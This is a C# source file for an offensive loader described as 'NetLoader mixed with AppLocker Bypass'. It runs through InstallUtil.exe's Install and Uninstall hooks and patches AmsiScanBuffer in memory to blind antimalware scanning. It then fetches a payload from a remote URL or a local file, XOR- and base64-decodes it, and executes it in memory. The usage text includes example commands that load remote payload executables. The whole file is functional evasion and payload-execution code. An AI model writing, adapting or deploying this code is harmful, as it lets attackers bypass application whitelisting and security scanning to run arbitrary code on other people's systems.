using System;
using System.Configuration.Install;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;
using System.Diagnostics;
using System.Collections.Specialized;
using System.Collections.Generic;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("NetLoader mixed with AppLocker Bypass PowerShell Runspace.");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : Installer
    {
        // ==================== CONSTANTS AND CONFIGURATION ====================
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const string KERNEL32_DLL = "kernel32.dll";
        private const string AMSI_DLL = "amsi.dll";
        private const string AMSI_SCAN_BUFFER = "AmsiScanBuffer";
        private const int TLS_PROTOCOL = 3072; // TLS 1.2

        // ==================== P/INVOKE IMPORTS ====================
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // ==================== GLOBAL STATE ====================
        private static object[] _globalArgs = null;
        private static bool _debugMode = false;

        // ==================== DEBUG HELPER ====================
        private static class DebugLogger
        {
            public static void Log(string message)
            {
                if (_debugMode)
                {
                    Console.WriteLine($"[DEBUG] {DateTime.Now:HH:mm:ss} {message}");
                }
            }

            public static void LogError(string message, Exception ex = null)
            {
                Console.WriteLine($"[ERROR] {message}");
                if (ex != null && _debugMode)
                {
                    Console.WriteLine($"[DEBUG EXCEPTION] {ex.GetType().Name}: {ex.Message}");
                    Console.WriteLine($"[DEBUG STACK] {ex.StackTrace}");
                }
            }

            public static void LogMemory(string operation, IntPtr address, int size = 0)
            {
                if (_debugMode)
                {
                    string addrStr = $"0x{address.ToInt64():X16}";
                    if (size > 0)
                    {
                        Console.WriteLine($"[DEBUG MEMORY] {operation} at {addrStr} (size: {size} bytes)");
                    }
                    else
                    {
                        Console.WriteLine($"[DEBUG MEMORY] {operation} at {addrStr}");
                    }
                }
            }

            public static void HexDump(byte[] data, string label = "", int maxBytes = 64)
            {
                if (!_debugMode || data == null || data.Length == 0) return;

                Console.WriteLine($"[DEBUG HEXDUMP] {label} ({data.Length} bytes):");

                int bytesToShow = Math.Min(data.Length, maxBytes);
                for (int i = 0; i < bytesToShow; i += 16)
                {
                    Console.Write($"  {i:X4}: ");

                    // Hex bytes
                    for (int j = 0; j < 16; j++)
                    {
                        if (i + j < bytesToShow)
                            Console.Write($"{data[i + j]:X2} ");
                        else
                            Console.Write("   ");
                    }

                    Console.Write(" ");

                    // ASCII representation
                    for (int j = 0; j < 16; j++)
                    {
                        if (i + j < bytesToShow)
                        {
                            byte b = data[i + j];
                            Console.Write(b >= 32 && b <= 126 ? (char)b : '.');
                        }
                    }

                    Console.WriteLine();
                }

                if (data.Length > maxBytes)
                    Console.WriteLine($"  ... (truncated, total {data.Length} bytes)");
            }
        }

        // ==================== XOR DECRYPTION ====================
        private static class XorCryptography
        {
            public static byte[] Decrypt(byte[] data, string key)
            {
                if (data == null || data.Length == 0)
                    return data;

                if (string.IsNullOrEmpty(key))
                {
                    DebugLogger.LogError("XOR key is empty");
                    throw new ArgumentException("XOR key cannot be null or empty");
                }

                DebugLogger.Log($"XOR decrypting {data.Length} bytes with key: '{key}'");
                DebugLogger.HexDump(data, "Encrypted data", 128);

                byte[] keyBytes = Encoding.UTF8.GetBytes(key);
                byte[] result = new byte[data.Length];

                for (int i = 0; i < data.Length; i++)
                {
                    result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
                }

                DebugLogger.HexDump(result, "Decrypted data", 128);

                // Validate decryption - check for valid PE header (optional)
                if (result.Length > 2 && result[0] == 0x4D && result[1] == 0x5A) // MZ
                {
                    DebugLogger.Log("Valid PE header found after decryption");
                }
                else if (result.Length > 4)
                {
                    // Check for .NET assembly header
                    uint peOffset = BitConverter.ToUInt32(result, 0x3C);
                    if (peOffset < result.Length - 2 &&
                        result[peOffset] == 0x50 && result[peOffset + 1] == 0x45) // PE
                    {
                        DebugLogger.Log("Valid .NET assembly found after decryption");
                    }
                }

                return result;
            }

            public static byte[] Encrypt(byte[] data, string key)
            {
                if (data == null || data.Length == 0)
                    return data;

                if (string.IsNullOrEmpty(key))
                    throw new ArgumentException("XOR key cannot be null or empty");

                // XOR encryption is symmetric
                return Decrypt(data, key);
            }

            public static bool ValidateKey(byte[] encryptedData, string key, int checkOffset = 0)
            {
                if (encryptedData == null || encryptedData.Length < checkOffset + 4 || string.IsNullOrEmpty(key))
                    return false;

                try
                {
                    byte[] testBytes = new byte[4];
                    Array.Copy(encryptedData, checkOffset, testBytes, 0, 4);
                    byte[] keyBytes = Encoding.UTF8.GetBytes(key);

                    for (int i = 0; i < 4; i++)
                    {
                        testBytes[i] ^= keyBytes[i % keyBytes.Length];
                    }

                    // Common .NET assembly patterns to check
                    return testBytes[0] == 0x4D && testBytes[1] == 0x5A; // MZ header
                }
                catch
                {
                    return false;
                }
            }
        }

        // ==================== AMSI PATCHING - SIMPLIFIED VERSION ====================
        private static class AMSIPatcher
        {
            public static bool PatchAMSI()
            {
                try
                {
                    DebugLogger.Log("Starting AMSI patch procedure");

                    // Load amsi.dll
                    IntPtr amsiModule = LoadLibrary(AMSI_DLL);
                    if (amsiModule == IntPtr.Zero)
                    {
                        DebugLogger.LogError($"Failed to load {AMSI_DLL}");
                        return false;
                    }

                    DebugLogger.LogMemory($"{AMSI_DLL} loaded at", amsiModule);

                    // Obtain AmsiScanBuffer address
                    IntPtr amsiScanBufferPtr = GetProcAddress(amsiModule, AMSI_SCAN_BUFFER);
                    if (amsiScanBufferPtr == IntPtr.Zero)
                    {
                        DebugLogger.LogError($"Failed to find {AMSI_SCAN_BUFFER}");
                        return false;
                    }

                    DebugLogger.LogMemory($"{AMSI_SCAN_BUFFER} address", amsiScanBufferPtr);

                    // Patch depending on the arch
                    byte[] patchBytes;
                    if (IntPtr.Size == 8)  // 64-bit
                    {
                        // mov eax, 0x80070057 ; ret
                        patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                    }
                    else  // 32-bit
                    {
                        // mov eax, 0x80070057 ; ret 0x18
                        patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                    }

                    DebugLogger.HexDump(patchBytes, "AMSI patch bytes");

                    // Change memory protection
                    bool success = VirtualProtect(
                        amsiScanBufferPtr,
                        (UIntPtr)patchBytes.Length,
                        PAGE_EXECUTE_READWRITE,
                        out uint oldProtect);

                    if (!success)
                    {
                        DebugLogger.LogError("VirtualProtect failed");
                        return false;
                    }

                    DebugLogger.Log($"Memory protection changed. Old protection: 0x{oldProtect:X}");

                    // Apply patch
                    Marshal.Copy(patchBytes, 0, amsiScanBufferPtr, patchBytes.Length);

                    // Verify patch
                    byte[] verifyBytes = new byte[patchBytes.Length];
                    Marshal.Copy(amsiScanBufferPtr, verifyBytes, 0, patchBytes.Length);

                    if (verifyBytes.SequenceEqual(patchBytes))
                    {
                        DebugLogger.Log("AMSI patch verified successfully");
                        Console.WriteLine("[+] Successfully patched AMSI!");
                        return true;
                    }
                    else
                    {
                        DebugLogger.LogError("Patch verification failed");
                        DebugLogger.HexDump(verifyBytes, "Verification bytes");
                        return false;
                    }
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("AMSI patching failed", ex);
                    return false;
                }
            }
        }

        // ==================== PAYLOAD LOADING ====================
        private static class PayloadLoader
        {
            public static byte[] ReadLocalFile(string filePath)
            {
                DebugLogger.Log($"Reading local file: {filePath}");

                if (!File.Exists(filePath))
                {
                    DebugLogger.LogError($"File not found: {filePath}");
                    throw new FileNotFoundException($"File not found: {filePath}");
                }

                byte[] data = File.ReadAllBytes(filePath);
                DebugLogger.Log($"Read {data.Length} bytes from {filePath}");
                DebugLogger.HexDump(data, $"File content: {Path.GetFileName(filePath)}", 128);

                return data;
            }

            public static byte[] DownloadFromUrl(string url)
            {
                DebugLogger.Log($"Downloading from URL: {url}");

                using (var client = new WebClient())
                {
                    client.Proxy.Credentials = CredentialCache.DefaultCredentials;
                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");

                    DebugLogger.Log("Starting download...");
                    byte[] data = client.DownloadData(url);
                    DebugLogger.Log($"Downloaded {data.Length} bytes from {url}");
                    DebugLogger.HexDump(data, "Downloaded content", 128);

                    return data;
                }
            }

            public static void SetTLSProtocol(int protocolType)
            {
                DebugLogger.Log($"Setting SecurityProtocol to: {protocolType} (0x{protocolType:X})");
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)protocolType;
            }

            public static void ExecuteAssembly(byte[] assemblyBytes, string[] args)
            {
                DebugLogger.Log($"Loading assembly ({assemblyBytes.Length} bytes)");

                // Validate that it has the MZ header (optional, it can be a .NET assembly)
                if (assemblyBytes.Length < 2)
                {
                    DebugLogger.LogError("Assembly too small");
                    throw new BadImageFormatException("Assembly too small");
                }

                // Try to load assembly
                Assembly assembly = Assembly.Load(assemblyBytes);
                DebugLogger.Log($"Assembly loaded: {assembly.FullName}");

                MethodInfo entryPoint = assembly.EntryPoint;
                if (entryPoint == null)
                {
                    DebugLogger.LogError("Assembly has no entry point");
                    throw new EntryPointNotFoundException("Assembly has no entry point");
                }

                DebugLogger.Log($"Entry point: {entryPoint.Name} in {entryPoint.DeclaringType?.FullName}");

                object[] invokeArgs;
                if (entryPoint.GetParameters().Length > 0)
                {
                    invokeArgs = new object[] { args ?? Array.Empty<string>() };
                }
                else
                {
                    invokeArgs = null;
                }

                DebugLogger.Log($"Invoking entry point with {(invokeArgs != null ? invokeArgs.Length : 0)} arguments");

                entryPoint.Invoke(null, invokeArgs);
                DebugLogger.Log("Assembly execution completed");
            }
        }

        // ==================== PARAMETER PARSING ====================
        private class Parameters
        {
            public bool DebugMode { get; set; }
            public bool Base64Encoded { get; set; }
            public bool XorEncrypted { get; set; }
            public string XorKey { get; set; }
            public string PayloadPath { get; set; }
            public string[] PayloadArguments { get; set; }

            public static Parameters Parse(StringDictionary contextParams)
            {
                var parameters = new Parameters
                {
                    DebugMode = IsParameterTrue(contextParams, "debug"),
                    Base64Encoded = IsParameterTrue(contextParams, "b64"),
                    XorKey = contextParams["xor"] ?? string.Empty,
                    PayloadPath = contextParams["path"] ?? string.Empty,
                    PayloadArguments = ParseArgumentList(contextParams["args"])
                };

                parameters.XorEncrypted = !string.IsNullOrEmpty(parameters.XorKey);

                // Set global debug mode
                _debugMode = parameters.DebugMode;

                DebugLogger.Log($"Parsed parameters:");
                DebugLogger.Log($"  DebugMode: {parameters.DebugMode}");
                DebugLogger.Log($"  Base64Encoded: {parameters.Base64Encoded}");
                DebugLogger.Log($"  XorEncrypted: {parameters.XorEncrypted}");
                DebugLogger.Log($"  XorKey: {(parameters.XorEncrypted ? "***" + parameters.XorKey.Substring(Math.Max(0, parameters.XorKey.Length - 3)) : "<none>")}");
                DebugLogger.Log($"  PayloadPath: {parameters.PayloadPath}");
                DebugLogger.Log($"  PayloadArguments: {(parameters.PayloadArguments.Length > 0 ? string.Join(", ", parameters.PayloadArguments) : "<none>")}");

                return parameters;
            }

            private static bool IsParameterTrue(StringDictionary parameters, string name)
            {
                return parameters.ContainsKey(name) &&
                       (string.IsNullOrEmpty(parameters[name]) ||
                        bool.TryParse(parameters[name], out bool value) && value);
            }

            private static string[] ParseArgumentList(string arguments)
            {
                if (string.IsNullOrWhiteSpace(arguments))
                    return Array.Empty<string>();

                return arguments.Split(new[] { ',', ';' }, StringSplitOptions.RemoveEmptyEntries)
                               .Select(arg => arg.Trim())
                               .ToArray();
            }
        }

        // ==================== BASE64 DECODING ====================
        private static class Base64Decoder
        {
            public static string DecodeIfNeeded(string input, bool isBase64)
            {
                if (!isBase64 || string.IsNullOrEmpty(input))
                    return input;

                try
                {
                    DebugLogger.Log($"Base64 decoding input ({input.Length} chars)");
                    byte[] bytes = Convert.FromBase64String(input);
                    string result = Encoding.UTF8.GetString(bytes);
                    DebugLogger.Log($"Base64 decoded to: {result}");
                    return result;
                }
                catch (FormatException ex)
                {
                    DebugLogger.LogError("Invalid Base64 string", ex);
                    throw;
                }
            }

            public static byte[] DecodeBytesIfNeeded(byte[] input, bool isBase64)
            {
                if (!isBase64 || input == null || input.Length == 0)
                    return input;

                try
                {
                    string base64String = Encoding.UTF8.GetString(input);
                    DebugLogger.Log($"Base64 decoding byte array ({input.Length} bytes)");
                    byte[] result = Convert.FromBase64String(base64String);
                    DebugLogger.Log($"Base64 decoded to {result.Length} bytes");
                    DebugLogger.HexDump(result, "Base64 decoded bytes", 128);
                    return result;
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("Failed to decode Base64 bytes", ex);
                    throw;
                }
            }
        }

        // ==================== MAIN INSTALLER LOGIC ====================
        private static void PrintHelp()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  InstallUtil.exe /debug /b64 /xor=<key> /path=<binary_path> /args=\"arg1,arg2\"");
            Console.WriteLine("\nParameters:");
            Console.WriteLine("  /debug        - Enable debug logging");
            Console.WriteLine("  /b64          - Parameters are base64 encoded");
            Console.WriteLine("  /xor=<key>    - XOR decryption key (required if payload is XOR encrypted)");
            Console.WriteLine("  /path=<path>  - Mandatory path/URL of binary to load");
            Console.WriteLine("  /args=<list>  - Optional comma-separated arguments for binary");
            Console.WriteLine("\nExamples:");
            Console.WriteLine("  InstallUtil.exe /debug /path=http://server/payload.exe");
            Console.WriteLine("  InstallUtil.exe /xor=MyKey123 /path=C:\\payload.enc");
            Console.WriteLine("  InstallUtil.exe /b64 /xor=key /path=aHR0cDovL3NlcnZlci9wYXlsb2FkLmVuYw== /args=arg1,arg2");
        }

        private static void TriggerPayload(Parameters parameters)
        {
            Console.WriteLine($"[+] Bypass Tool Starting (Debug: {_debugMode})");

            if (string.IsNullOrEmpty(parameters.PayloadPath))
            {
                Console.WriteLine("[!] Error: No payload path specified");
                PrintHelp();
                return;
            }

            // Decode Base64 parameters if needed
            if (parameters.Base64Encoded)
            {
                DebugLogger.Log("Decoding Base64 encoded parameters");
                parameters.PayloadPath = Base64Decoder.DecodeIfNeeded(parameters.PayloadPath, true);
                parameters.XorKey = Base64Decoder.DecodeIfNeeded(parameters.XorKey, true);

                if (parameters.PayloadArguments.Length > 0)
                {
                    for (int i = 0; i < parameters.PayloadArguments.Length; i++)
                    {
                        parameters.PayloadArguments[i] = Base64Decoder.DecodeIfNeeded(parameters.PayloadArguments[i], true);
                    }
                }
            }

            Console.WriteLine($"[+] Payload: {parameters.PayloadPath}");
            if (parameters.PayloadArguments.Length > 0)
            {
                Console.WriteLine($"[+] Arguments: {string.Join(" ", parameters.PayloadArguments)}");
            }
            if (parameters.XorEncrypted)
            {
                Console.WriteLine($"[+] XOR Decryption: Enabled");
            }

            // Step 1: Patch AMSI (optional, continue if failure)
            DebugLogger.Log("Step 1: Patching AMSI");
            bool amsiPatched = AMSIPatcher.PatchAMSI();
            if (!amsiPatched)
            {
                DebugLogger.Log("AMSI patch failed, continuing anyway...");
                Console.WriteLine("[!] AMSI patch failed (may not be needed for this payload)");
            }

            // Step 2: Load payload data
            DebugLogger.Log("Step 2: Loading payload data");
            byte[] payloadData;

            try
            {
                if (parameters.PayloadPath.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                {
                    DebugLogger.Log("Loading from URL");
                    PayloadLoader.SetTLSProtocol(TLS_PROTOCOL);
                    payloadData = PayloadLoader.DownloadFromUrl(parameters.PayloadPath);
                }
                else
                {
                    DebugLogger.Log("Loading from file");
                    payloadData = PayloadLoader.ReadLocalFile(parameters.PayloadPath);
                }
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Failed to load payload", ex);
                Console.WriteLine($"[!] Failed to load payload: {ex.Message}");
                return;
            }

            // Step 3: Decrypt if XOR encrypted
            if (parameters.XorEncrypted)
            {
                DebugLogger.Log("Step 3: Decrypting XOR payload");
                try
                {
                    payloadData = XorCryptography.Decrypt(payloadData, parameters.XorKey);
                    DebugLogger.Log("XOR decryption completed successfully");
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("XOR decryption failed", ex);
                    Console.WriteLine("[!] XOR decryption failed. Check your key.");
                    return;
                }
            }

            // Step 4: Decode Base64 data if needed (for payload itself)
            if (parameters.Base64Encoded)
            {
                DebugLogger.Log("Step 4: Decoding Base64 payload data");
                try
                {
                    payloadData = Base64Decoder.DecodeBytesIfNeeded(payloadData, true);
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError("Base64 decode failed", ex);
                    Console.WriteLine("[!] Failed to decode Base64 payload");
                    return;
                }
            }

            // Step 5: Execute payload
            DebugLogger.Log("Step 5: Executing payload");
            try
            {
                PayloadLoader.ExecuteAssembly(payloadData, parameters.PayloadArguments);
                DebugLogger.Log("Payload execution completed successfully");
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Payload execution failed", ex);
                Console.WriteLine($"[!] Error executing payload: {ex.Message}");

                if (_debugMode)
                {
                    Console.WriteLine($"[DEBUG] Exception type: {ex.GetType().Name}");
                }
            }

            Console.WriteLine($"[+] Execution Finished");
        }

        // Install and Uninstall methods required
        public override void Install(System.Collections.IDictionary savedState)
        {
            base.Install(savedState);
            Console.WriteLine("[+] Install method called");

            try
            {
                var parameters = Parameters.Parse(Context.Parameters);
                TriggerPayload(parameters);
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Install failed", ex);
                Console.WriteLine($"[!] Fatal error: {ex.Message}");

                if (_debugMode)
                {
                    Console.WriteLine("[DEBUG] Press Enter to exit...");
                    Console.ReadLine();
                }
            }
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            Console.WriteLine("[+] Uninstall method called");

            try
            {
                var parameters = Parameters.Parse(Context.Parameters);
                TriggerPayload(parameters);
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Uninstall failed", ex);
                Console.WriteLine($"[!] Fatal error: {ex.Message}");

                if (_debugMode)
                {
                    Console.WriteLine("[DEBUG] Press Enter to exit...");
                    Console.ReadLine();
                }
            }
        }
    }
}
